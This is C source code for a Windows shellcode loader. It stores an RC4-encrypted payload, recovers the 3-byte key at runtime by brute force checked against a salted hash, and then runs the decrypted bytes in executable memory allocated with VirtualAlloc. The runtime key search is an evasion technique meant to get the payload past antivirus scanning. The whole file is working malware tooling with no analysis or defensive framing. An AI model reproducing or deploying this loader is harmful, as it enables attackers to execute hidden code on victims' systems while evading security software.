#include <windows.h>

// Encrypted shellcode
unsigned char encrypted_shellcode[] = "\xd4\xa0\x28\xa8\x36\xf0\x94\x2b\xe7\x22\x99\x1f\x82\x2f\x2b\x0d\x78\xb3\xb9\x51\x8e\xca\x1a\xc7\x79\x99\x8c\x22\xa1\x54\x9f\xe4\x37\x9e\x96\x44\x55\x9b\x04\xb7\x96\xe9\x08\xb4\x25\xfa\xd4\xab\xb3\x7d\xf2\x55\x55\x40\x59\xf2\xad\xfa\x09\xa5\x2a\xd6\x7e\xc5\x8e\xb8\xfa\x7a\x1d\xbe\x3b\xdf\x25\x6c\x5a\x3a\xdb\xeb\x44\x7a\x06\x88\xed\x4c\xbe\x1e\xfe\x49\x00\x50\x92\x24\x5b\x96\x1e\x35\x0e\x0d\x10\xc6\x0e\x91\x53\x46\x73\x29\x15\xa0\xb1\x0d\xd5\xac\x9a\x7d\x86\x04\xf8\xc6\xa2\x79\x7a\x82\x73\x89\xab\x12\x6c\xa8\x2a\x84\x15\xdc\x16\x1f\x44\x83\x1d\x15\x85\x47\x4b\xc8\xd1\x92\xaa\x52\x56\x61\x6e\x3d\xa3\x04\xa3\x1b\xf8\xf9\x83\x7c\x1a\xf3\xe2\x3d\x23\xb5\x06\x43\x5b\x3f\xdb\x69\xfc\x68\xaf\x94\xa8\x11\x9b\xd3\x7a\xa9\x34\x9d\xa8\x1f\xf2\x72\xbb\xd4\x6b\xd4\x9a\x9a\x4a\x14\xf2\xe1\x98\x3c\x1c\x78\x10\x9e\xec\x14\x12\x01\x0e\x64\x23\x5a\xb2\x85\x56\x15\x4f\x8e\x0e\xb8\xa2\x16\x68\x89\xf0\x98\x2f\xa3\x7a\xe2\xfc\x2a\xca\x04\x77\xc7\x43\x64\xb5\xf3\x6e\xbd\xb4\xee\x9e\x11\x23\xc3\xaf\x6f\xab\xb2\x5e\x60\x87\xd8\xed\xc4\x2a\x84\x14\x51\x25\xf3\xf1\x90\x53\xc2\xe4\x2a\x1a\x74\x28\xec\x0c\xcb\xe3\xc5\x49\x51\xcc\x04\xf9\xfb\x16\x89\x9b\x1e\x3a\x62\xe6\xa0\xc2\x49\x0c\xcf\x33\x34\xd6\xa7\x67\x18\xdc\xf0\x9d";
unsigned char expected_hash[] = "\x30\x63\xa9\x20";
unsigned char salt[] = "\xf0\x51\xaf\xc6\x8c\x36\xd7\x5c";

// RC4 state structure
typedef struct {
    unsigned char S[256];
    unsigned char i;
    unsigned char j;
} rc4_state_t;

// RC4 initialization (KSA)
void rc4_init(rc4_state_t *st, const unsigned char *key, int keylen) {
    int i, j = 0;
    unsigned char tmp;
    
    for (i = 0; i < 256; i++) st->S[i] = (unsigned char)i;
    st->i = 0;
    st->j = 0;
    
    for (i = 0; i < 256; i++) {
        j = (j + st->S[i] + key[i % keylen]) % 256;
        tmp = st->S[i];
        st->S[i] = st->S[j];
        st->S[j] = tmp;
    }
    st->i = 0;
    st->j = 0;
}

// RC4 decryption (PRGA)
void rc4_decrypt(rc4_state_t *st, unsigned char *data, int len) {
    int k;
    unsigned char tmp, K;
    
    for (k = 0; k < len; k++) {
        st->i = (st->i + 1) % 256;
        st->j = (st->j + st->S[st->i]) % 256;
        tmp = st->S[st->i];
        st->S[st->i] = st->S[st->j];
        st->S[st->j] = tmp;
        K = st->S[(st->S[st->i] + st->S[st->j]) % 256];
        data[k] ^= K;
    }
}

// djb2 hash for validation
unsigned int djb2_hash(const unsigned char *data, int len) {
    unsigned int hash = 5381;
    int i;
    
    for (i = 0; i < len; i++) {
        hash = ((hash * 33) + data[i]) & 0xFFFFFFFF;
    }
    return hash;
}

// Convert 4 bytes to uint (little-endian)
unsigned int bytes_to_uint(const unsigned char *bytes) {
    return (unsigned int)bytes[0] | 
           ((unsigned int)bytes[1] << 8) | 
           ((unsigned int)bytes[2] << 16) | 
           ((unsigned int)bytes[3] << 24);
}

// Recursive bruteforce to find RC4 key
int bruteforce_key(unsigned char *key, int pos, int max_len, int shellcode_len, unsigned char *decrypted_buffer) {
    int i;
    rc4_state_t rc4_state;
    unsigned int calculated_hash;
    unsigned int target_hash = bytes_to_uint(expected_hash);
    
    // If we've built a complete key, test it
    if (pos == max_len) {
        // Copy encrypted shellcode to decrypt buffer
        memcpy(decrypted_buffer, encrypted_shellcode, shellcode_len);
        
        // Initialize RC4 with current key and decrypt
        rc4_init(&rc4_state, key, max_len);
        rc4_decrypt(&rc4_state, decrypted_buffer, shellcode_len);
        
        // Create buffer for shellcode + salt for hash validation
        unsigned char hash_input[4096 + 64];
        memcpy(hash_input, decrypted_buffer, shellcode_len);
        int salt_len = sizeof(salt) - 1; // -1 for null terminator
        memcpy(hash_input + shellcode_len, salt, salt_len);
        
        // Calculate hash and validate
        calculated_hash = djb2_hash(hash_input, shellcode_len + salt_len);
        
        if (calculated_hash == target_hash) {
            return 1; // Key found!
        }
        return 0;
    }
    
    // Try all possible byte values (1-255, avoiding null bytes)
    for (i = 1; i <= 255; i++) {
        key[pos] = (unsigned char)i;
        if (bruteforce_key(key, pos + 1, max_len, shellcode_len, decrypted_buffer)) {
            return 1;
        }
    }
    
    return 0;
}

int main() {
    unsigned char key[3];
    unsigned char decrypted_shellcode[4096];
    int shellcode_len = sizeof(encrypted_shellcode) - 1;
    int found = 0;
    
    // Bruteforce RC4 key of 3 bytes
    memset(key, 0, sizeof(key));
    if (bruteforce_key(key, 0, 3, shellcode_len, decrypted_shellcode)) {
        found = 1;
    }
    
    if (found) {
        // Key found, inject and execute decrypted shellcode
        void *execs = VirtualAlloc(0, shellcode_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (execs) {
            memcpy(execs, decrypted_shellcode, shellcode_len);
            ((void(*)())(execs))();
        }
    }

    return 0;
}